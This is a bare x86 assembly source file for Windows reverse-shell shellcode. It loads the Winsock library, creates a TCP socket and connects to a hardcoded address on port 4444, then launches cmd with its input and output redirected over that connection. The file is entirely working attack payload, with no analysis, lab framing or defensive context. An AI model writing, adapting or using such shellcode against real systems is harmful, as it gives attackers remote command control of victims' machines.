[BITS 32]
_start:

       ; Get the windows socket dll name
       xor eax, eax
       mov ax, 0x3233         ; '\0\023' 
       push eax
       push dword 0x5f327377  ; '_2sw'
       push esp

       ; LoadLibrary
       mov ebx, 0x77e41dc6  ; LoadLibraryA(libraryname)
       call ebx
       mov ebp, eax         ; winsocket dll handle is saved into ebp


       ; Get the funtion name: WSAStartUp
       xor eax, eax
       mov ax, 0x7075      ; '\0\0up'
    push eax
    push 0x74726174     ; 'trat'
    push 0x53415357     ; 'SASW'
    push esp

       push ebp

       mov ebx, 0x77e63d7a  ; GetProcAddress(hmodule, functionname)
       call ebx

       ; CAll WSAStartUp
       xor ebx, ebx
       mov bx, 0x0190
       sub esp, ebx
       push esp
       push ebx

       call eax             ; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)


       ; Get the function name: WSASocketA
       xor eax, eax
       mov ax, 0x4174      ; '\0\0At'
       push eax
       push 0x656b636f     ; 'ekco'
       push 0x53415357     ; 'SASW'
       push esp

    push ebp

    mov ebx, 0x77e63d7a    ; GetProcAddress(hmodule, functionname)
    call ebx

       ; Call WSASocket
       xor ebx, ebx
       push ebx
       push ebx
       push ebx
       xor ecx, ecx
       mov cl, 6
       push ecx
       inc ebx
       push ebx
       inc ebx
       push ebx

       call eax    ; WSASocket(AF_INET = 2, SOCK_STREAM = 1,
                            ;   IPPROTO_TCP = 6, NULL,
                            ;   (unsigned int)NULL, (unsigned int)NULL);


       xchg eax, edi        ; Save the socket handle into edi


       ; Get the function name: connect
       mov ebx, 0x74636565 ; '\0tce'
       shr ebx, 8
       push ebx
       push 0x6e6e6f63     ; 'nnoc'
       push esp

    push ebp

    mov ebx, 0x77e63d7a ; GetProcAddress(hmodule, functionname)
    call ebx

       ; Call connect
       push 0x01aea8c0      ; host ipv4
       push word 0x5c11     ; 0x115c = port 4444
       xor ebx, ebx
       add bl, 2
       push word bx
       mov edx, esp

       push byte 16
       push edx
       push edi

       call eax            ; connect(s1, (SOCKADDR*) &hax, sizeof(hax) = 16);


       ; Call CreateProcess with redirected streams
       mov edx, 0x646d6363
       shr edx, 8
       push edx
       mov ecx, esp

       xor edx, edx

       sub esp, 16
       mov ebx, esp         ; PROCESS_INFORMATION

       push edi
       push edi
       push edi
       push edx
       push edx
       xor eax, eax
       inc eax
       rol eax, 8
       inc eax
       push eax
       push edx
       push edx
       push edx
       push edx
       push edx
       push edx
       push edx
       push edx
       push edx
       push edx
       xor eax, eax
       add al, 44
       push eax
       mov eax, esp         ; STARTUP_INFO

       push ebx                 ; PROCESS_INFORMATION
       push eax                 ; STARTUP_INFO
       push edx
       push edx
       push edx
       xor eax, eax
       inc eax
       push eax
       push edx
       push edx
       push ecx
       push edx

       mov ebx, 0x77e424a9  ; CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
       call ebx


end:
       ; xor edx, edx
       ; push eax
       ; mov eax, 0x75982acf  ; ExitProcess(exitcode)
       ; call eax
